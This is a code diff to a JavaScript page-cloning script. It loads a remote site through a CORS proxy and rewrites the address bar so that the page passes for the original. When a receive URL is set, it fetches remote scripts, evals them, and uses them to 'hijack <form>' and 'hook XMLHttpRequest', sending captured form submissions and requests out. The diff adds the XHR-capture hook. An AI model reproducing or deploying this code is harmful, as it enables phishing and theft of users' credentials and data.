@@ -10,13 +10,18 @@
       link.href = url;
       return link;
     });
-    $.get(`https://crossorigin.me/${get_link(url).href}`,data=>{
-      var target = get_link(url);
+    var target = get_link(url);
+    var is_origin = target.hostname==location.hostname;
+    $.get(is_origin?url:`https://jsonp.afeld.me/?url=${encodeURIComponent(target.href)}`,data=>{
       history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
-      data = data.replace(/<head.*>/i,`
-        <head>
-          <base href="${target.protocol}//${target.host}/">
-      `);
+      if(/<head.*>/i.test(data)){
+        data = data.replace(/<head.*>/i,`
+          <head>
+            <base href="${target.protocol}//${target.host}/">
+        `);
+      }else{
+        data = `<base href="${target.protocol}//${target.host}/">${data}`;
+      }
       if(document.write.toString().indexOf('[native code]')==-1){
         var doc = document.implementation.createHTMLDocument();
         document.write = doc.write;
@@ -27,14 +32,13 @@
       document.write(data);
       document.close();
       if(/<title/i.test(data)){
-        document.title = data.match(/<title\s.*>(.*)<\/title>/i)[1];
+        document.title = data.match(/<title\s*.*>([\w|\W]*)<\/title>/mi)[1];
       }else{
-        document.title = location.hostname;
+        document.title = target.hostname;
       }
-      if(document.head){
-        $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
-      }
+      $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
       if(receive_url){
+        //hijack <form>
         $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
           setInterval(()=>{
             eval(data);
@@ -44,6 +48,11 @@
               }
             });
           },1000);
+        });
+        //hook XMLHttpRequest
+        $.get('https://raw.githubusercontent.com/jackmasa/captureXHR/master/captureXHR.js',data=>{
+          eval(data);
+          captureXHR(receive_url);
           onload && setTimeout(onload,233);
         });
       }else{
